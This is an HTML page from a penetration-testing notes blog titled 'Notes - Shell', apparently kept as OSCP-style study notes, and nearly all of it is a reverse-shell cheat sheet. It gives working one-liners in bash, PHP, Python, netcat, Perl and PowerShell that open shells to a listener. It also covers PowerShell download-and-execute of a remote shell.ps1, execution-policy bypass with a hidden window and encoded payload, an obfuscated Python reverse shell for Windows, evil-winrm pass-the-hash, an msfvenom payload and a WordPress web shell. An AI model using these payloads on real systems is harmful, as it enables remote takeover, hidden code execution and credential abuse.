@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - Shell // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - Shell"/>
+<meta name="twitter:description" content="Cheat sheets https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet https://github.com/the-emmon/lsp-reverse-shell Common shells # bash &gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1 # php &gt; php -r &#39;$sock=fsockopen(&#34;127.0.0.1&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; # python &gt; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;127.0.0.1&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; # nc1 &gt; nc -e /bin/sh 127.0.0.1 4444 # nc2 &gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f # perl &gt; perl -e &#39;use Socket;$i=&#34;127.0.0.1&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; ## perl Windows &gt; perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;ip:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; use IO::Socket; use IO::Socket::INET; $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;ip:443&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;; # ruby * https://github."/>
+
+    <meta property="og:title" content="Notes - Shell" />
+<meta property="og:description" content="Cheat sheets https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet https://github.com/the-emmon/lsp-reverse-shell Common shells # bash &gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1 # php &gt; php -r &#39;$sock=fsockopen(&#34;127.0.0.1&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; # python &gt; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;127.0.0.1&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; # nc1 &gt; nc -e /bin/sh 127.0.0.1 4444 # nc2 &gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f # perl &gt; perl -e &#39;use Socket;$i=&#34;127.0.0.1&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; ## perl Windows &gt; perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;ip:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; use IO::Socket; use IO::Socket::INET; $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;ip:443&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;; # ruby * https://github." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/notes/4-shell/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-07T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-07T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Notes - Shell</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 7, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="cheat-sheets">Cheat sheets</h1>
+<ul>
+<li><a href="https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet">https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet</a></li>
+<li><a href="https://github.com/the-emmon/lsp-reverse-shell">https://github.com/the-emmon/lsp-reverse-shell</a></li>
+</ul>
+<h1 id="common-shells">Common shells</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># bash</span>
+</span></span><span style="display:flex;"><span>&gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># php</span>
+</span></span><span style="display:flex;"><span>&gt; php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;127.0.0.1&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># python</span>
+</span></span><span style="display:flex;"><span>&gt; python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;127.0.0.1&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nc1</span>
+</span></span><span style="display:flex;"><span>&gt; nc -e /bin/sh 127.0.0.1 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nc2</span>
+</span></span><span style="display:flex;"><span>&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 <span style="color:#ae81ff">4444</span> &gt;/tmp/f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># perl</span>
+</span></span><span style="display:flex;"><span>&gt; perl -e <span style="color:#e6db74">&#39;use Socket;$i=&#34;127.0.0.1&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## perl Windows</span>
+</span></span><span style="display:flex;"><span>&gt; perl -MIO -e <span style="color:#e6db74">&#39;$c=new IO::Socket::INET(PeerAddr,&#34;ip:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use IO::Socket;
+</span></span><span style="display:flex;"><span>use IO::Socket::INET;
+</span></span><span style="display:flex;"><span>$p<span style="color:#f92672">=</span>fork;exit,if<span style="color:#f92672">(</span>$p<span style="color:#f92672">)</span>;$c<span style="color:#f92672">=</span>new IO::Socket::INET<span style="color:#f92672">(</span>PeerAddr,<span style="color:#e6db74">&#34;ip:443&#34;</span><span style="color:#f92672">)</span>;STDIN-&gt;fdopen<span style="color:#f92672">(</span>$c,r<span style="color:#f92672">)</span>;$~-&gt;fdopen<span style="color:#f92672">(</span>$c,w<span style="color:#f92672">)</span>;system$_ <span style="color:#66d9ef">while</span>&lt;&gt;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ruby</span>
+</span></span><span style="display:flex;"><span>* https://github.com/secjohn/ruby-shells
+</span></span><span style="display:flex;"><span>&gt; system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><h1 id="nc">nc</h1>
+<ul>
+<li>better listener</li>
+</ul>
+<pre tabindex="0"><code>&gt; rlwrap netcat -lvnp 4444
+</code></pre><ul>
+<li>If nc is blocked, try <strong>nc.traditional</strong></li>
+<li>If nc not available, upload it, url encode <code>chmod +x nc</code> to <code>chmod%20%2bx%20nc</code></li>
+</ul>
+<h1 id="php">php</h1>
+<ul>
+<li>if <code>system</code> disabled, try other functions: <a href="https://www.php.net/manual/en/function.system.php">https://www.php.net/manual/en/function.system.php</a></li>
+<li><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></li>
+</ul>
+<h1 id="powershell">powershell</h1>
+<ul>
+<li>Reverse shell payload</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;ip&#34;</span>,4444);$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..65535|%{0};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;$sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Call shell script</span>
+</span></span><span style="display:flex;"><span>&gt; powershell.exe IEX (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://ip/shell.ps1&#39;</span>)
+</span></span></code></pre></div><ul>
+<li>Run powershell from terminal</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Execution policy bypass</span>
+</span></span><span style="display:flex;"><span>&gt; powershell -ExecutionPolicy Bypass
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run a command</span>
+</span></span><span style="display:flex;"><span>&gt; powershell -c &lt;cmd&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run encoded command</span>
+</span></span><span style="display:flex;"><span>&gt; powershell -EncodedCommand &lt;b64&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># All in one</span>
+</span></span><span style="display:flex;"><span>&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand &lt;b64-payload&gt;
+</span></span></code></pre></div><ul>
+<li>Invoke-PowerShellTcp.ps1: <a href="https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; Import-Module .\Invoke-PowerShellTcp.ps1
+&gt; Invoke-PowerShellTcp -Reverse -IPAddress ip -Port 4444
+</code></pre><ul>
+<li>Run a specific function in a script</li>
+</ul>
+<pre tabindex="0"><code>&gt; powershell -ExecutionPolicy Bypass -command &#34;&amp; { . .\script1.ps1; My-Func }&#34;
+</code></pre><ul>
+<li>Invoke powershell shell as a different user</li>
+</ul>
+<pre tabindex="0"><code>&gt; $SecPassword = ConvertTo-SecureString &#39;&lt;pass&gt;&#39; -AsPlainText -Force
+&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;&lt;domain&gt;\&lt;user&gt;&#39;, $SecPassword)
+&gt; Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;ip&gt;/shell.ps1&#39;) } -Credential $Cred
+</code></pre><h1 id="python">python</h1>
+<ul>
+<li>linux</li>
+</ul>
+<pre tabindex="0"><code>&gt; python -c &#39;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;ip&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><ul>
+<li>windows-python</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(<span style="color:#66d9ef">lambda</span> __y, __g, __contextlib: [[[[[[[(s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;ip&#39;</span>, <span style="color:#ae81ff">4444</span>)), [[[(s2p_thread<span style="color:#f92672">.</span>start(), [[(p2s_thread<span style="color:#f92672">.</span>start(), (<span style="color:#66d9ef">lambda</span> __out: (<span style="color:#66d9ef">lambda</span> __ctx: [__ctx<span style="color:#f92672">.</span>__enter__(), __ctx<span style="color:#f92672">.</span>__exit__(<span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>), __out[<span style="color:#ae81ff">0</span>](<span style="color:#66d9ef">lambda</span>: <span style="color:#66d9ef">None</span>)][<span style="color:#ae81ff">2</span>])(__contextlib<span style="color:#f92672">.</span>nested(type(<span style="color:#e6db74">&#39;except&#39;</span>, (), {<span style="color:#e6db74">&#39;__enter__&#39;</span>: <span style="color:#66d9ef">lambda</span> self: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;__exit__&#39;</span>: <span style="color:#66d9ef">lambda</span> __self, __exctype, __value, __traceback: __exctype <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> (issubclass(__exctype, <span style="color:#a6e22e">KeyboardInterrupt</span>) <span style="color:#f92672">and</span> [<span style="color:#66d9ef">True</span> <span style="color:#66d9ef">for</span> __out[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">in</span> [((s<span style="color:#f92672">.</span>close(), <span style="color:#66d9ef">lambda</span> after: after())[<span style="color:#ae81ff">1</span>])]][<span style="color:#ae81ff">0</span>])})(), type(<span style="color:#e6db74">&#39;try&#39;</span>, (), {<span style="color:#e6db74">&#39;__enter__&#39;</span>: <span style="color:#66d9ef">lambda</span> self: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;__exit__&#39;</span>: <span style="color:#66d9ef">lambda</span> __self, __exctype, __value, __traceback: [<span style="color:#66d9ef">False</span> <span style="color:#66d9ef">for</span> __out[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">in</span> [((p<span style="color:#f92672">.</span>wait(), (<span style="color:#66d9ef">lambda</span> __after: __after()))[<span style="color:#ae81ff">1</span>])]][<span style="color:#ae81ff">0</span>]})())))([<span style="color:#66d9ef">None</span>]))[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> p2s_thread<span style="color:#f92672">.</span>daemon <span style="color:#f92672">in</span> [(<span style="color:#66d9ef">True</span>)]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;p2s_thread&#39;</span>] <span style="color:#f92672">in</span> [(threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>p2s, args<span style="color:#f92672">=</span>[s, p]))]][<span style="color:#ae81ff">0</span>])[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> s2p_thread<span style="color:#f92672">.</span>daemon <span style="color:#f92672">in</span> [(<span style="color:#66d9ef">True</span>)]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;s2p_thread&#39;</span>] <span style="color:#f92672">in</span> [(threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>s2p, args<span style="color:#f92672">=</span>[s, p]))]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;p&#39;</span>] <span style="color:#f92672">in</span> [(subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cmd.exe&#39;</span>], stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>STDOUT, stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE))]][<span style="color:#ae81ff">0</span>])[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;s&#39;</span>] <span style="color:#f92672">in</span> [(socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM))]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;p2s&#39;</span>], p2s<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">in</span> [(<span style="color:#66d9ef">lambda</span> s, p: (<span style="color:#66d9ef">lambda</span> __l: [(<span style="color:#66d9ef">lambda</span> __after: __y(<span style="color:#66d9ef">lambda</span> __this: <span style="color:#66d9ef">lambda</span>: (__l[<span style="color:#e6db74">&#39;s&#39;</span>]<span style="color:#f92672">.</span>send(__l[<span style="color:#e6db74">&#39;p&#39;</span>]<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">1</span>)), __this())[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">True</span> <span style="color:#66d9ef">else</span> __after())())(<span style="color:#66d9ef">lambda</span>: <span style="color:#66d9ef">None</span>) <span style="color:#66d9ef">for</span> __l[<span style="color:#e6db74">&#39;s&#39;</span>], __l[<span style="color:#e6db74">&#39;p&#39;</span>] <span style="color:#f92672">in</span> [(s, p)]][<span style="color:#ae81ff">0</span>])({}), <span style="color:#e6db74">&#39;p2s&#39;</span>)]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;s2p&#39;</span>], s2p<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">in</span> [(<span style="color:#66d9ef">lambda</span> s, p: (<span style="color:#66d9ef">lambda</span> __l: [(<span style="color:#66d9ef">lambda</span> __after: __y(<span style="color:#66d9ef">lambda</span> __this: <span style="color:#66d9ef">lambda</span>: [(<span style="color:#66d9ef">lambda</span> __after: (__l[<span style="color:#e6db74">&#39;p&#39;</span>]<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write(__l[<span style="color:#e6db74">&#39;data&#39;</span>]), __after())[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">if</span> (len(__l[<span style="color:#e6db74">&#39;data&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">else</span> __after())(<span style="color:#66d9ef">lambda</span>: __this()) <span style="color:#66d9ef">for</span> __l[<span style="color:#e6db74">&#39;data&#39;</span>] <span style="color:#f92672">in</span> [(__l[<span style="color:#e6db74">&#39;s&#39;</span>]<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>))]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">True</span> <span style="color:#66d9ef">else</span> __after())())(<span style="color:#66d9ef">lambda</span>: <span style="color:#66d9ef">None</span>) <span style="color:#66d9ef">for</span> __l[<span style="color:#e6db74">&#39;s&#39;</span>], __l[<span style="color:#e6db74">&#39;p&#39;</span>] <span style="color:#f92672">in</span> [(s, p)]][<span style="color:#ae81ff">0</span>])({}), <span style="color:#e6db74">&#39;s2p&#39;</span>)]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;os&#39;</span>] <span style="color:#f92672">in</span> [(__import__(<span style="color:#e6db74">&#39;os&#39;</span>, __g, __g))]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;socket&#39;</span>] <span style="color:#f92672">in</span> [(__import__(<span style="color:#e6db74">&#39;socket&#39;</span>, __g, __g))]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;subprocess&#39;</span>] <span style="color:#f92672">in</span> [(__import__(<span style="color:#e6db74">&#39;subprocess&#39;</span>, __g, __g))]][<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> __g[<span style="color:#e6db74">&#39;threading&#39;</span>] <span style="color:#f92672">in</span> [(__import__(<span style="color:#e6db74">&#39;threading&#39;</span>, __g, __g))]][<span style="color:#ae81ff">0</span>])((<span style="color:#66d9ef">lambda</span> f: (<span style="color:#66d9ef">lambda</span> x: x(x))(<span style="color:#66d9ef">lambda</span> y: f(<span style="color:#66d9ef">lambda</span>: y(y)()))), globals(), __import__(<span style="color:#e6db74">&#39;contextlib&#39;</span>))
+</span></span></code></pre></div><h1 id="shell-upgrade">shell upgrade</h1>
+<pre tabindex="0"><code>&gt; perl -e &#39;exec &#34;/bin/bash&#34;;&#39;
+&gt; echo os.system(&#39;/bin/bash&#39;)
+&gt; python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+&gt; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><h1 id="windows-run-session-as-a-different-user">Windows, run session as a different user</h1>
+<pre tabindex="0"><code>$SecPassword = ConvertTo-SecureString &#39;pass&#39; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#39;user&#39;, $SecPassword)
+$session = New-PSSession -Credential $Cred
+Invoke-Command -Session $session -scriptblock { &lt;cmd&gt; }
+</code></pre><h1 id="winrm-5985">winrm: 5985</h1>
+<pre tabindex="0"><code># evil-winrm
+&gt; gem install evil-winrm
+&gt; evil-winrm -H {ntml-hash} -i {target-ip} -u {user}
+</code></pre><h1 id="wordpress-plugin-shell">Wordpress plugin shell</h1>
+<ul>
+<li>/usr/share/wordlists/SecLists/Web-Shells/WordPress/plugin-shell.php</li>
+<li>Effective elf shell for wordpress on linux</li>
+</ul>
+<pre tabindex="0"><code>&gt; msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f elf &gt; shell.elf
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
